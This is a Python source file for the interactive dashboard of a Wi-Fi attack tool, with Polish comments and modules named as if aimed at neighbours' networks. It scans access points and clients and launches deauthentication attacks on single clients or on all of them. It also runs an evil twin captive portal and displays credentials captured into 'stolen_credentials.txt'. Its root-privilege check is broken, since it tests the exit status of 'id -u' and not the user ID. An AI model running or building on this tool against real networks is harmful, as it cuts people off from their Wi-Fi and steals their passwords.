#!/usr/bin/env python3

import sys
import time
import subprocess
import signal
import select  # Kluczowe do nieblokującego inputu
import math
import os
from typing import Optional

# Import modułów (upewnij się, że pliki są w tym samym folderze)
try:
    from find_lucky_neighbours import WiFiScanner
    from argue_with_neighbours import DeauthAttackManager
    from captive_portal import CaptivePortalAttack
except ImportError as e:
    print(f"[!] Critical Error: Missing modules. {e}")
    sys.exit(1)

# --- GLOBAL STATE ---
scanner: Optional[WiFiScanner] = None
attacker: Optional[DeauthAttackManager] = None
portal: Optional[CaptivePortalAttack] = None
current_interface: str = ""
selected_ap = None

# --- UTILS ---

def clear_screen():
    print("\033[H\033[J", end="")

def print_banner():
    print(r"""[ WIFI AUDIT TOOL v2.0 - LIVE DASHBOARD ]""")
    print("-" * 65)

def handle_exit_global(signum, frame):
    """Brutalne wyjście po Ctrl+C - sprząta po sobie."""
    print("\n\n[!] CRITICAL STOP. Restoring interfaces...")
    if attacker: attacker.stop_all_attacks()
    if portal: portal.stop_portal()
    if scanner:
        scanner.stop_scan()
        if current_interface:
            scanner.restore_managed_mode(current_interface)
    print("[+] Done. Exiting.")
    sys.exit(0)

# Rejestracja sygnału Ctrl+C
signal.signal(signal.SIGINT, handle_exit_global)

def input_with_timeout(timeout=2.0):
    """
    Czeka na input przez określony czas (timeout).
    Jeśli użytkownik nic nie wpisze, zwraca None (co pozwala odświeżyć ekran).
    Jeśli wpisze - zwraca tekst.
    """
    i, o, e = select.select([sys.stdin], [], [], timeout)
    if i:
        return sys.stdin.readline().strip()
    return None

# --- PHASE 1: INITIALIZATION ---

def init_interface():
    global scanner, current_interface
    scanner = WiFiScanner(debug=False)
    
    while True:
        clear_screen()
        print_banner()
        print("[ PHASE 1: Initialization ]\n")
        interfaces = scanner.get_interfaces()
        if not interfaces:
            print("[-] No wireless interfaces found.")
            sys.exit(1)
            
        print("Available Interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  [{i}] {iface}")
            
        choice = input("\nSelect interface index > ")
        if choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(interfaces):
                current_interface = interfaces[idx]
                break
                
    print(f"\n[*] Enabling Monitor Mode on {current_interface}...")
    if not scanner.set_monitor_mode(current_interface):
        print("[-] Failed to set monitor mode (Root required?)")
        sys.exit(1)
    print("[+] Monitor mode active.")
    time.sleep(1)

# --- PHASE 2: DISCOVERY DASHBOARD ---

def discovery_menu():
    global selected_ap
    
    # Automatyczny start skanowania przy wejściu w tę fazę
    if not scanner.scanning:
        scanner.start_ap_discovery(current_interface)

    while True:
        clear_screen()
        print_banner()
        
        # STATUS NA ŻYWO
        aps_count = len(scanner.networks)
        clients_activity = sum(len(c) for c in scanner.clients.values())
        scan_state = "SCANNING" if scanner.scanning else "PAUSED"
        
        print(f"Interface: {current_interface} | Mode: {scan_state}")
        print(f"Total APs: {aps_count}     | Total Clients Detected: {clients_activity}")
        print("=" * 65)
        print("[S] Stop/Start Scan")
        print("[L] Show AP List & Select Target")
        print("[Q] Quit Tool")
        print("=" * 65)
        print("(Screen refreshes automatically. Just type command...)")
        
        # Czekamy na klawisz lub timeout (odświeżenie)
        cmd = input_with_timeout(2.0)
        
        if cmd is None:
            continue # Pętla wraca na początek -> odświeża ekran
            
        cmd = cmd.lower()
        
        if cmd == 's':
            if scanner.scanning:
                scanner.stop_scan()
            else:
                scanner.start_ap_discovery(current_interface)
        
        elif cmd == 'l':
            scanner.stop_scan() # Zatrzymujemy skanowanie, żeby wybrać cel
            target = show_ap_list_interactive()
            if target:
                selected_ap = target
                target_dashboard_logic() # Przechodzimy do Fazy 3
                # Po powrocie wznawiamy skanowanie ogólne
                scanner.start_ap_discovery(current_interface)
                
        elif cmd == 'q':
            handle_exit_global(None, None)

def show_ap_list_interactive():
    # Lista statyczna do wyboru celu (paginacja)
    networks = list(scanner.networks.values())
    networks.sort(key=lambda x: x.signal_dbm, reverse=True)
    
    if not networks:
        print("\n[-] No APs found yet.")
        time.sleep(1)
        return None

    page = 0
    per_page = 20
    
    while True:
        total_pages = math.ceil(len(networks) / per_page)
        start_idx = page * per_page
        end_idx = start_idx + per_page
        page_networks = networks[start_idx:end_idx]
        
        clear_screen()
        print(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'CH':<3} {'PWR':<5} {'ENC':<8}")
        print("-" * 70)
        
        for idx, net in enumerate(page_networks, 1):
            ssid = (net.ssid if net.ssid else "<Hidden>")[:25]
            enc = getattr(net, 'crypto', 'OPEN')
            print(f"{idx:<3} {ssid:<25} {net.bssid:<18} {net.channel:<3} {net.signal_dbm:<5} {enc:<8}")
            
        print("-" * 70)
        print(f"Page {page + 1}/{total_pages} | Total: {len(networks)}")
        print(f"[n] Next | [p] Prev | [b] Back | OR Type Number to Select")
        
        sel = input("\nSelect > ").strip().lower()
        
        if sel == 'b':
            return None
        elif sel == 'n':
            if page < total_pages - 1: page += 1
        elif sel == 'p':
            if page > 0: page -= 1
        elif sel.isdigit():
            idx = int(sel)
            if 1 <= idx <= len(page_networks):
                return page_networks[idx - 1]

# --- PHASE 3: TARGET DASHBOARD (ALL IN ONE) ---

def target_dashboard_logic():
    global attacker, portal
    if attacker is None: attacker = DeauthAttackManager()
    if portal is None: portal = CaptivePortalAttack()
    
    msg = "" # Miejsce na komunikaty (np. "Attack Started")

    while True:
        clear_screen()
        # --- HEADER ---
        print("=" * 65)
        print(f" TARGET: {selected_ap.ssid} ({selected_ap.bssid})")
        print(f" CH: {selected_ap.channel} | PWR: {selected_ap.signal_dbm} | ENC: {getattr(selected_ap, 'crypto', '?')}")
        print("=" * 65)
        
        # --- CAPTIVE PORTAL MONITOR (LIVE) ---
        # To jest sekcja, która czyta plik na bieżąco
        print("\n [ CAPTIVE PORTAL MONITOR ]")
        portal_status = "RUNNING" if portal.is_running else "STOPPED"
        print(f" Status: {portal_status}")
        
        log_file = "stolen_credentials.txt" # Musi się zgadzać z nazwą w captive_portal.py
        if os.path.exists(log_file):
            try:
                with open(log_file, "r") as f:
                    lines = f.readlines()
                    if not lines:
                        print("   (File empty - waiting for data...)")
                    else:
                        print(f"   Total Captured Entries: {len(lines)}")
                        print("   --- LATEST DATA ---")
                        # Pokazujemy 3 ostatnie linie
                        for line in lines[-3:]:
                            print(f"   > {line.strip()}")
            except Exception as e:
                print(f"   (Error reading log file: {e})")
        else:
            print("   (No log file yet. Start Portal to generate one.)")
        
        print("-" * 65)
        
        # --- CLIENTS LIST (DEEP SCAN) ---
        ds_status = "ACTIVE" if scanner.deep_scanning else "OFF"
        clients = scanner.clients.get(selected_ap.bssid, [])
        
        print(f"\n [ CLIENTS LIST (Deep Scan: {ds_status}) ]")
        if not clients:
            print("   No clients detected yet. (Turn ON Deep Scan)")
        else:
            print(f"   {'ID':<3} {'MAC ADDRESS':<18} {'PWR':<6} {'LAST SEEN'}")
            for i, c in enumerate(clients, 1):
                # Formatowanie czasu (tylko godzina)
                time_str = c.last_seen.split("T")[-1][:8] if "T" in c.last_seen else c.last_seen
                print(f"   [{i}] {c.mac:<18} {c.signal_dbm:<6} {time_str}")
        
        print("\n" + "=" * 65)
        print(" COMMANDS:")
        print(" [S] Toggle Deep Scan (Find Clients)")
        print(" [P] Start Evil Twin Portal")
        print(" [B] Broadcast Deauth (Kick ALL)")
        print(" [K] STOP ALL ATTACKS (Panic Button)")
        print(" [0] Back to AP List")
        print(" [1-9] Type Client ID to DEAUTH specific user")
        
        if msg:
            print(f"\n >> {msg}")
            msg = "" # Czyścimy po wyświetleniu

        # Czekamy 3 sekundy na komendę, potem odświeżamy
        cmd = input_with_timeout(3.0)
        
        if cmd is None:
            continue # Odśwież ekran
            
        cmd = cmd.strip().lower()
        
        # --- LOGIKA KOMEND ---
        
        if cmd == '0':
            scanner.stop_scan()
            attacker.stop_all_attacks()
            # Nie zatrzymujemy portalu automatycznie przy wyjściu z menu, 
            # chyba że tego chcesz. Tutaj portal może działać w tle.
            break
            
        elif cmd == 's':
            if scanner.deep_scanning:
                scanner.stop_scan()
                msg = "Deep Scan STOPPED."
            else:
                scanner.lock_on_ap(current_interface, selected_ap.bssid, selected_ap.channel)
                msg = "Deep Scan STARTED. Watching for clients..."
                
        elif cmd == 'p':
            if portal.start_portal(current_interface, selected_ap.ssid):
                msg = "Captive Portal STARTED. Monitor is active above."
            else:
                msg = "Portal already running."

        elif cmd == 'b':
            # Atak Broadcast (wszyscy)
            attacker.start_client_attack("ff:ff:ff:ff:ff:ff", selected_ap.bssid, current_interface)
            for c in clients:
                attacker.start_client_attack(c.mac, selected_ap.bssid, current_interface)
            msg = "BROADCAST DEAUTH SENT to everyone!"
            
        elif cmd == 'k':
            attacker.stop_all_attacks()
            portal.stop_portal()
            if scanner.deep_scanning: scanner.stop_scan()
            msg = "ALL SYSTEMS STOPPED."

        elif cmd.isdigit():
            # Atak na konkretnego klienta po numerze ID z listy
            idx = int(cmd)
            if 1 <= idx <= len(clients):
                target_mac = clients[idx-1].mac
                attacker.start_client_attack(target_mac, selected_ap.bssid, current_interface)
                msg = f"DEAUTH ATTACK STARTED on {target_mac}"
            else:
                msg = "Invalid Client ID."

# --- ENTRY POINT ---

if __name__ == "__main__":
    # Sprawdzenie uprawnień roota
    if subprocess.call("id -u", shell=True, stdout=subprocess.DEVNULL) != 0:
        print("[-] Root privileges required. Please run with sudo.")
        sys.exit(1)
        
    try:
        init_interface()
        discovery_menu()
    except KeyboardInterrupt:
        handle_exit_global(None, None)
